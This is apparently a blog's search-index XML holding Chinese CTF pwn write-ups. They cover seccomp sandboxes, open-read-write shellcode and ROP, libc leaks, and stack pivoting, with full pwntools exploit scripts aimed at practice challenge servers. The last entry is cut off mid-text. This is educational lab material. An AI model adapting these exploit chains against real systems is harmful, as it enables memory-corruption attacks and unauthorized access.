<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>栈上ORW学习总结</title>
    <link href="/2024/11/12/%E6%A0%88%E4%B8%8AORW%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2024/11/12/%E6%A0%88%E4%B8%8AORW%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识：沙箱保护和ORW"><a href="#前置知识：沙箱保护和ORW" class="headerlink" title="前置知识：沙箱保护和ORW"></a>前置知识：沙箱保护和ORW</h1><h2 id="沙箱保护-SandBox"><a href="#沙箱保护-SandBox" class="headerlink" title="沙箱保护 SandBox"></a>沙箱保护 SandBox</h2><p>正常情况下,程序可以使用所有的syscall，这是不安全的，我们可以劫持程序流后通过execve的syscall来getshell。<br>如果不想让程序去执行execve，我们可以这样做：将程序放入一个沙箱中，在这个沙箱中添加一条规则——禁用execve函数。在这个沙箱中的程序只要调用了execve的系统调用，直接给他中断掉，这就是沙箱sendbox的作用。</p><p>SandBox的实现一般有两种，一种是<a href="https://www.cnblogs.com/L0g4n-blog/p/12839171.html">seccomp()函数调用</a>，另一种是<a href="https://blog.csdn.net/qq_44846324/article/details/121731640">prctl()函数调用</a></p><h2 id="沙箱检测"><a href="#沙箱检测" class="headerlink" title="沙箱检测"></a>沙箱检测</h2><p>首先安装seccomp-tools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install gcc ruby-dev<br><span class="hljs-built_in">sudo</span> gem install seccomp-tools<br></code></pre></td></tr></table></figure><p>工具用法：seccomp-tools dump “程序”<br><img src="/img/p2/image-1.png"><br>可以看到程序如果调用了execve或execveat，会跳转到0004，然后被KILL掉，也就是程序禁用了execve和execveat <strong>（system函数实质上也是调用了execve函数，所以也禁用了system函数）</strong> </p><h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>想想我们以前是怎么拿到flag的？我们是先get shell，然后在shell中去执行我们想要的操作（cat &#x2F;flag），但如果程序禁用了execve，能不能跳过get shell的步骤，去直接拿到flag呢？</p><p>这就是ORW（open,read,write）的攻击方式：open打开目标的flag文件，read读取flag文件，write显示flag文件的内容。</p><p><strong>open()：打开文件</strong></p><blockquote><p>函数原型：int open(char <em>path,int access);<br>char <em>path——要打开的包含路径的文件名<br>int access——打开方式(只读模式、只写模式 、读写模式)——**设为0-只读模式</em></em><br>返回值： 成功  返回fd ，失败  返回-1</p></blockquote><p><strong>read()：读取文件内容</strong></p><blockquote><p>函数原型： int read(int fd,void <em>buf,int len);<br>int fd——文件描述符——*<em>设为open的返回值fd，一般为3，表示从打开的文件中读取内容</em></em><br>void *buf——为要将读取的内容保存的缓冲区<br>int len——读取文件的长度<br>返回值：返回实际读取的字节数</p></blockquote><p><strong>write()：写文件</strong></p><blockquote><p>函数原型： int write(int fd,void <em>buf,int len);<br>int fd——文件描述符——*<em>设为1,表示写</em></em><br>void *buf——要写入的内容<br>int len——要写入的长度<br>返回值：返回实际写入文件内容的长度</p></blockquote><p>栈上的orw根据利用方式分为orw_shellcode型和orw_ROP型，通过两个例题入手</p><h1 id="例1：ORW-shellcode-极客大挑战-2019-Not-Bad"><a href="#例1：ORW-shellcode-极客大挑战-2019-Not-Bad" class="headerlink" title="例1：ORW_shellcode [极客大挑战 2019]Not Bad"></a>例1：ORW_shellcode [极客大挑战 2019]Not Bad</h1><blockquote><p>题目链接：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p></blockquote><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec;file，64位，保护全关——没有开NX保护，可以在栈上写shellcode<br><img src="/img/p2/image-2.png"><br>IDA里面看到有三个函数，并在0x123000处开辟了0x1000的<strong>可写可执行</strong>的空间<br><img src="/img/p2/image-3.png"></p><p>第一个函数开启了seccomp函数，将他重命名为seccomp_init</p><p><img src="/img/p2/image-4.png"><br>第二个函数是设置缓存区，不用管<br><img src="/img/p2/image-5.png"><br>第三个函数就是我们的vuln函数了，buf这里可以看到一个明显的栈溢出，溢出长度为0x18字节<br><img src="/img/p2/image-6.png"></p><p>另外我们找到了一个 jmp rsp 汇编指令的地址，这个jmp rsp到底有什么用呢？我们在后面讲一下<br><img src="/img/p2/image-7.png"><br>既然开启了沙箱保护，那我们就用seccomp-tools看一下，可以看到函数允许了open,write,read函数，可以通过ORW的方式去获取到flag的内容<br><img src="/img/p2/image-8.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>溢出的长度只有0x18，是不够我们写入shellcode的，但是mmap为我们在0x123000开始的位置提供了很大一片空间，那么就可以用read函数在这块空间写入我们的shellcode（shellcode写什么？当然是open打开flag、read写入flag、write输出flag）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mmap</span> = <span class="hljs-number">0</span>x123000<br><span class="hljs-attribute">orw</span> = shellcraft.open(&#x27;./flag&#x27;)        <br><span class="hljs-attribute">orw</span>+ = shellcraft.read(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0</span>x100)      <br><span class="hljs-attribute">orw</span>+ = shellcraft.write(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0</span>x100)<br><span class="hljs-attribute">payload</span> = cyclic(<span class="hljs-number">0</span>x20+<span class="hljs-number">8</span>) + asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0</span>x100))<br></code></pre></td></tr></table></figure><p>这样send(payload)之后我们再send(orw)，就向mmap的空间写入了我们的shellcode，但是接下来的问题就是如何跳转到这里执行shellcode。这里就可以讲一下jmp rsp的作用</p><h2 id="jmp-rsp到底有什么用呢？"><a href="#jmp-rsp到底有什么用呢？" class="headerlink" title="jmp rsp到底有什么用呢？"></a>jmp rsp到底有什么用呢？</h2><p>调试看一下正常情况的vuln函数结束前后的栈结构，在leave;ret之前rsp的地址为0xddc0<br><img src="/img/p2/image-9.png"><br>leave，将rsp移到了rbp并+8<br><img src="/img/p2/image-10.png"><br>ret，rsp再+8<br><img src="/img/p2/image-11.png"><br>总的来说，rsp从0xddc0的位置来到了0xddf0的位置，想象一下如果我们将ret覆盖为 jmp rsp ，会怎么样呢？因为rsp现在来到了0xddf0，所以rip会指向0xddf0。<br>那么我们就知道该如何进行跳转了，把填充垃圾数据的部分利用起来，看看下边右图的栈结构<br><img src="/img/p2/image-12.png"><br>在栈顶写入read(0,mmap,0x100);mov rax;0x123000;call rax，填充垃圾数据，然后将ret覆盖为jmp esp，那么rip重新指向现在的rsp的值，接下来rsp-0x30（0x30&#x3D;填充的0x28+rsp自增的8），回到绿色的那两行，这两行用来做什么的？向read读入我们的orw，并且call调用它</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload = <span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.read</span>(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0</span>x100)) +<span class="hljs-built_in">asm</span>(<span class="hljs-string">&#x27;mov r15,0x123000;call r15&#x27;</span>)<br>payload = payload<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">0</span>x28,b<span class="hljs-string">&#x27;\x90&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(jmp_rsp) + <span class="hljs-built_in">asm</span>(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>其实call rax和jmp rax都可以，区别如下：<br>call会把他的下一条指令的地址压入堆栈，然后跳转到他调用的开始处，同时ret会自动弹出返回地址。<br>JMP只是简单的跳转<br>call的本质相当于push+jmp  ret的本质相当于pop+jmp</p></blockquote><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs lua">from pwn import *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28895</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./bad&#x27;</span>)<br>jmp_rsp = <span class="hljs-number">0x400A01</span><br>mmap = <span class="hljs-number">0x123000</span><br>orw = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>orw += shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0x100</span>)<br>orw += shellcraft.<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0x100</span>)<br>orw = asm(orw)<br>payload = asm(shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>)) +asm(<span class="hljs-string">&#x27;mov r15,0x123000;call r15&#x27;</span>)<br>payload = payload.ljust(<span class="hljs-number">0x28</span>,b<span class="hljs-string">&#x27;\x90&#x27;</span>)<br>payload += p64(jmp_rsp) + asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvline()<br><span class="hljs-built_in">io</span>.send(payload)<br><span class="hljs-built_in">io</span>.send(orw)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h1 id="例2：ORW-ROP-HGAME-2023-week1-orw"><a href="#例2：ORW-ROP-HGAME-2023-week1-orw" class="headerlink" title="例2：ORW_ROP [HGAME 2023 week1] orw"></a>例2：ORW_ROP [HGAME 2023 week1] orw</h1><blockquote><p>题目链接：<a href="https://www.nssctf.cn/problem/3489">https://www.nssctf.cn/problem/3489</a></p></blockquote><h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>先把ld和libc链接到程序</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw<span class="hljs-symbol">$</span> patchelf --<span class="hljs-keyword">set</span>-interpreter /home/<span class="hljs-comment">kuban</span>/Desktop/<span class="hljs-comment">pwn</span>/test/<span class="hljs-comment">orw</span>/ld<span class="hljs-number">-2.31</span>.so vuln <br>kuban@kuban-virtual-machine:~/<span class="hljs-comment">Desktop</span>/pwn/<span class="hljs-comment">test</span>/orw$ patchelf --replace-needed libc.so<span class="hljs-number">.6</span> /<span class="hljs-comment">home</span>/kuban/<span class="hljs-comment">Desktop</span>/pwn/<span class="hljs-comment">test</span>/orw/<span class="hljs-comment">libc-2.31.so vuln</span><br>kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ ldd <span class="hljs-comment">vuln</span> <br>        linux-vdso.so.1 (0x00007fff70b25000)<br>        /home/kuban/Desktop/pwn/test/orw/libc<span class="hljs-number">-2.31</span>.so (<span class="hljs-number">0x000076c7d729c000</span>)<br>        /home/kuban/Desktop/pwn/test/orw/ld-2.31.so <span class="hljs-comment">=&gt;</span> /lib64/<span class="hljs-comment">ld-linux-x86-64.so.2 (0x000076c7d7490000)</span><br></code></pre></td></tr></table></figure><p>checksec;file，64位，开启NX保护<br><img src="/img/p2/image-13.png"><br>IDA里面看一下<br>main函数开启了一个沙箱，输出一行后调用vuln函数<br><img src="/img/p2/image-14.png"><br>vuln函数就是一个非常简单的栈溢出，溢出长度有0x30个字节<br><img src="/img/p2/image-15.png"><br>检测一下沙箱，可以看到函数禁用了execve函数<br><img src="/img/p2/image-16.png"><br>记录一下gadget<br><img src="/img/p2/image-17.png"></p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>这道题主要有四个问题需要解决</p><ol><li><p>禁用了execve<br>解决方法：当然是orw啦</p></li><li><p>程序没有open、write函数<br>解决方法：用puts泄露libc，在libc中找到open,write并且返回到vuln函数继续下一步的利用</p></li><li><p>栈溢出长度只有0x28，不够写入ROP链<br>解决方法：利用leave_ret gadget将栈迁移到bss段<br><img src="/img/p2/image-18.png"></p></li><li><p>我们open之后，read和write要用到rdi,rsi和rdx三个寄存器传参，可是我们没有控制rdx的gadget？<br>解决办法：使用libc里面的rsi和rdx，libc_base+[libc_rsi&#x2F;rdx] 就可以了（具体看一下exp应该就懂了）<br><img src="/img/p2/image-19.png"></p><blockquote><p>其实对于问题3，我们也可以在libc中找到pop rsp的指令实现栈迁移，大家伙儿感兴趣可以试试</p></blockquote></li></ol><p>那么我们就可以分三步走<br>第一步：泄露libc，找到open,write并且返回到vuln函数，为第二步中read的buf迁移做准备。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pop_rdi = <span class="hljs-number">0</span>x401393<br>ret = <span class="hljs-number">0</span>x40101a<br>leave_ret = <span class="hljs-number">0</span>x4012be<br>libc_dump_rsi = <span class="hljs-number">0</span>x2601f<br>libc_dump_rdx = <span class="hljs-number">0</span>x142c92<br><br>payload1 = <span class="hljs-built_in">cyclic</span>(<span class="hljs-number">0</span>x100+<span class="hljs-number">8</span>) + <span class="hljs-built_in">p64</span>(pop_rdi) + <span class="hljs-built_in">p64</span>(puts_got) + <span class="hljs-built_in">p64</span>(puts_plt) + <span class="hljs-built_in">p64</span>(vuln_addr)<br>io<span class="hljs-selector-class">.sendafter</span>(<span class="hljs-string">&#x27;before you try to solve this task.&#x27;</span>,payload1)<br>puts_addr = <span class="hljs-built_in">u64</span>(io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<span class="hljs-selector-attr">[-6:]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(hex(puts_addr)</span></span>)<br></code></pre></td></tr></table></figure><p>计算libc基地址，写出目标中我们需要的函数和gadget的地址</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">libc_base</span> = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attr">open_addr</span> = libc_base + libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br><span class="hljs-attr">read_addr</span> = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>] <span class="hljs-comment"># read_addr = elf.plt[&#x27;read&#x27;]</span><br><span class="hljs-attr">write_addr</span> = libc_base + libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attr">pop_rsi</span> = libc_base + libc_dump_rsi<br><span class="hljs-attr">pop_rdi</span> = libc_base + libc_dump_rdi<br></code></pre></td></tr></table></figure><p>第二步：第一步完成后程序回到了vuln函数即将执行read(0, buf, 0x130uLL); 看一下汇编，可以看到这个read 写入的位置在 rbp-0x100 的位置<br><img src="/img/p2/image-20.png"></p><p>我们想要向bss段写入我们的orw，那么我们可以将rbp迁移到newrbp&#x3D;bss+0x200的位置，read就会向newrbp-0x100的位置写入数据了，我们的payload2这样构造</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">newrbp</span> = elf.bss(<span class="hljs-number">0</span>x200)<br><span class="hljs-attr">payload2</span> = cyclic(<span class="hljs-number">0</span>x100) + p64(newrbp) + p64(?)<br></code></pre></td></tr></table></figure><p>返回地址填什么？填vuln就错了，我们得直接去找到执行read(0, buf, 0x130uLL)的指令，才能向newrbp-0x100的位置写入ROP<br><img src="/img/p2/image-21.png"></p><p>这个指令在0x4012CF，我们可以写成vuln+0xF</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">newrbp = elf<span class="hljs-selector-class">.bss</span>(<span class="hljs-number">0</span>x200)<br>payload2 = <span class="hljs-built_in">cyclic</span>(<span class="hljs-number">0</span>x100) + <span class="hljs-built_in">p64</span>(newrbp) + <span class="hljs-built_in">p64</span>(vuln_addr + <span class="hljs-number">0</span>xF)<br>io<span class="hljs-selector-class">.sendline</span>(payload2)<br></code></pre></td></tr></table></figure><p>第三步：现在就是往我们的newbrp-0x100的位置写入flag和orw(flag)，最后将rbp覆盖为bss，返回地址覆盖为leave_ret，完成栈的迁移，执行ROP</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali">payload3 = b&#x27;/flag&#x27;.ljust(8,b&#x27;\x00&#x27;)<br>payload3 += p64(pop_rdi) + p64(newrbp-0x100) +p64(pop_rsi) + p64(0) + p64(open_addr)    <span class="hljs-comment"># open</span><br>payload3 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(elf.bss(0x400)) + p64(pop_rdx) + p64(0x100) + p64(read_addr)     <span class="hljs-comment"># read</span><br>payload3 += p64(pop_rdi) + p64(1) + p64(write_addr)     <span class="hljs-comment">#write    #复用我们的rsi和rdx，不用重新pop了</span><br><span class="hljs-comment"># payload3 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x100) + p64(write_addr)</span><br>payload3 = payload3.ljust(0x100,b&#x27;\x00&#x27;) + p64(newrbp-0x100) + p64(leave_ret)<br>io.sendline(payload3)<br></code></pre></td></tr></table></figure><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br>context(log_level=&#x27;DEBUG&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)<br>io = remote(&#x27;node5.anna.nssctf.cn&#x27;,21109)<br>elf = ELF(&#x27;./vuln&#x27;)<br>libc = ELF(&#x27;./libc-2.31.so&#x27;)<br>pop_rdi = 0x401393<br>ret = 0x40101a<br>leave_ret = 0x4012be<br>libc_dump_rsi = 0x2601f<br>libc_dump_rdx = 0x142c92<br>vuln_addr = 0x4012C0<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br><br>payload1 = cyclic(0x100+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>io.sendlineafter(&#x27;before you try to solve this task.&#x27;,payload1)<br>puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>success(hex(puts_addr))<br><br>libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]<br>open_addr = libc_base + libc.symbols[&#x27;open&#x27;]<br><span class="hljs-comment"># read_addr = libc_base + libc.symbols[&#x27;read&#x27;]         </span><br>read_addr = elf.plt[&#x27;read&#x27;]<br>write_addr = libc_base + libc.symbols[&#x27;write&#x27;]<br>pop_rsi = libc_base + libc_dump_rsi<br>pop_rdx =  libc_base + libc_dump_rdx<br><br>newrbp = elf.bss(0x200)<br>payload2 = cyclic(0x100) + p64(newrbp) + p64(vuln_addr + 0xF)<br>io.sendline(payload2)<br><br>payload3 = b&#x27;/flag&#x27;.ljust(8,b&#x27;\x00&#x27;)<br>payload3 += p64(pop_rdi) + p64(newrbp-0x100) +p64(pop_rsi) + p64(0) + p64(open_addr)        <span class="hljs-comment"># open</span><br>payload3 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(elf.bss(0x400)) + p64(pop_rdx) + p64(0x100) + p64(read_addr)         <span class="hljs-comment"># read</span><br>payload3 += p64(pop_rdi) + p64(1) + p64(write_addr)          <span class="hljs-comment">#write</span><br><span class="hljs-comment"># payload3 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x100) + p64(write_addr)</span><br>payload3 = payload3.ljust(0x100,b&#x27;\x00&#x27;) + p64(newrbp-0x100) + p64(leave_ret)<br>io.sendline(payload3)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>栈迁移学习总结</title>
    <link href="/2024/11/07/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2024/11/07/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="markdown-body"><h1 id="前置知识：什么是栈迁移？"><a href="#前置知识：什么是栈迁移？" class="headerlink" title="前置知识：什么是栈迁移？"></a>前置知识：什么是栈迁移？</h1><blockquote><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting</a></p></blockquote><p>首先看一下正常的程序结构，函数在结束时会进行leave和ret指令<br>——leave做两件事，第一件事是mov esp,ebp，也就是将esp移到ebp的位置，第二件事是pop ebp，也就是将ebp移到上一个函数的记录的位置上去<br>——ret就做一件事pop eip，也就是将esp中的内容弹入eip中，也就是内容放到程序的执行流上。<br><img src="/img/p1/s1.PNG"><br>在栈迁移中，很多情况下我们需要在栈上的返回地址覆盖为leave_ret的gadget上（这里的0xcffc），让程序执行两次leave_ret，那连续的两个leave_ret后栈会发生什么变化呢？<br>回到初始状态，假设我们的栈可以溢出到返回地址，我们将ebp覆盖为esp的地址（0xcfd0），返回地址覆盖为一个leave_ret的gadget，观察下面的图<br><img src="/img/p1/s2.PNG"><br>可以看到，栈在经历过两次leave_ret后，程序的执行流又回到了我们的栈空间，那如果我们在写入数据的时候，从0xcfd4的位置开始写入我们的system函数的地址，那就可以把system函数放到程序的执行流，从而执行我们的system(‘&#x2F;bin&#x2F;sh’)</p><hr><p>通过两道例题实践栈迁移</p><h1 id="例1：ciscn-2019-es-2"><a href="#例1：ciscn-2019-es-2" class="headerlink" title="例1：ciscn_2019_es_2"></a>例1：ciscn_2019_es_2</h1><blockquote><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_2">https://buuoj.cn/challenges#ciscn_2019_es_2</a></p></blockquote><p>checksec;file：32位，开启NX保护<br><img src="/img/p1/s3.PNG"></p><p>IDA里面分析，栈溢出发生在vul函数，但是只可以溢出0x8的字节，这只能够覆盖ebp_main和返回地址，而想再向栈上像ret2text那样写入system和binsh显然不可行<br><img src="/img/p1/s4.PNG"></p><p>这个时候就要考虑栈迁移了<br>程序存在system函数，但没有binsh字符串，我们需要向某个地址写入binsh<br><img src="/img/p1/s5.PNG"></p><p>那向哪个位置写入我们的binsh呢？其实就可以写到这个栈中，只要拿到了ebp的地址，就可以通过偏移拿到栈上任意内容的地址。<br>那ebp的地址怎么拿到呢？我们知道read函数结束时会自动加‘\x00’作为字符串的截断，然后输出时遇到’\x00’停止输出，如果我们在第一次read的时候给他填满0x30个字符，那么read就没地方给他补上’\x00’了，那么输出的时候打印完0x30个字符，就会继续打印出ebp的地址了。<br>第一次read拿到ebp的地址后，第二次read就要控制程序的执行流了<br>根据前置知识布置一下栈结构<br><img src="/img/p1/s6.PNG"></p><p>gdb调试看一下read后的栈结构，偏移为0x28(&#x3D;0xf8-0xd0)，同时这个0x28也是我们写入的字符串距离ebp的位置<br><img src="/img/p1/s7.PNG"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">esp_addr</span> = ebp_addr - <span class="hljs-number">0</span>x38    <span class="hljs-comment">#这是我们迁移的位置(迁移到栈顶)</span><br><span class="hljs-attr">binsh_addr</span> = ebp_addr - <span class="hljs-number">0</span>x28    <span class="hljs-comment">#这是我们写入的binsh距离ebp的位置</span><br></code></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,<span class="hljs-built_in">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26904</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br><br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>leave_ret = <span class="hljs-number">0x08048562</span>          #<span class="hljs-number">0x08048562</span> : leave ; ret<br><br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">36</span> + b<span class="hljs-string">&#x27;bbbb&#x27;</span><br><span class="hljs-built_in">io</span>.sendafter(<span class="hljs-string">&#x27;name?\n&#x27;</span>,payload1)<br><span class="hljs-built_in">io</span>.recvuntil(b<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>ebp_addr = u32(<span class="hljs-built_in">io</span>.recv(<span class="hljs-number">4</span>))<br>success(hex(ebp_addr))<br>esp_addr = ebp_addr - <span class="hljs-number">0x38</span><br>binsh_addr = ebp_addr - <span class="hljs-number">0x28</span><br><br>payload2 = b<span class="hljs-string">&#x27;aaaa&#x27;</span>+ p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh_addr) + b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>payload2 = payload2.ljust(<span class="hljs-number">0x28</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(ebp_addr<span class="hljs-number">-0x38</span>) + p32(leave_ret)<br><br><span class="hljs-built_in">io</span>.sendline(payload2)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h1 id="例2：-Black-Watch-入群题-PWN1"><a href="#例2：-Black-Watch-入群题-PWN1" class="headerlink" title="例2：[Black Watch 入群题]PWN1"></a>例2：[Black Watch 入群题]PWN1</h1><blockquote><p><a href="https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN">https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN</a></p></blockquote><p>checksec;file，32位，开启NX保护<br><img src="/img/p1/s8.png"><br>放到IDA里面分析，栈溢出发生在vul_function的buf，溢出的长度为0x20-0x18&#x3D;0x8个字节，跟例1一样，能覆盖掉ebp和返回地址</p><p><img src="/img/p1/s9.png"></p><p>而与上题有两点不同：<br>一是没有system，所以首先要泄露libc里的函数的地址，然后用libc里的system函数和binsh字符串get shell；<br>二是这里有个变量s，她存到了程序的bss段，bss段我们可以写入0x200的数据。<strong>例1我们是把栈迁移回了栈中，这里我们要把栈迁移到bss段去。</strong><br><img 